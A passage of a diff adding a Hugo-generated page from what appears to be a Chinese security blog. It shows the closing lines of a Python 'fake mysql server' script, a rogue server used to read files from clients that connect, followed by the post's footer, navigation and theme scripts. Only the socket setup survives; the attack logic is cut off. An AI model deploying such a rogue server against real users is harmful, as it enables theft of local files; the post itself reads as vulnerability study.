+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    HOST <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0.0.0.0&#39;</span>
+</span></span><span style="display:flex;"><span>    PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">3309</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    sk <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span>
+</span></span><span style="display:flex;"><span>    sk<span style="color:#f92672">.</span>setsockopt(socket<span style="color:#f92672">.</span>SOL_SOCKET, socket<span style="color:#f92672">.</span>SO_REUSEADDR, <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    sk<span style="color:#f92672">.</span>bind((HOST, PORT))
+</span></span><span style="display:flex;"><span>    sk<span style="color:#f92672">.</span>listen(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;start fake mysql server listening on </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(HOST,PORT))
+</span></span><span style="display:flex;"><span>    run()
+</span></span></code></pre></div><p>诚然，这种方法是没有上一个脚本来得自动化的，但是比较方便复现。</p>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://dragonbox.top/posts/sec-ghostcat/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>GhostCat(CVE-2020-1938)漏洞学习</span>
+  </a>
+  <a class="next" href="https://dragonbox.top/posts/tech-idea-start-servlet/">
+    <span class="title">Next »</span>
+    <br>
+    <span>使用idea开启Servlet</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://dragonbox.top/">ch4ser の 超元域</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
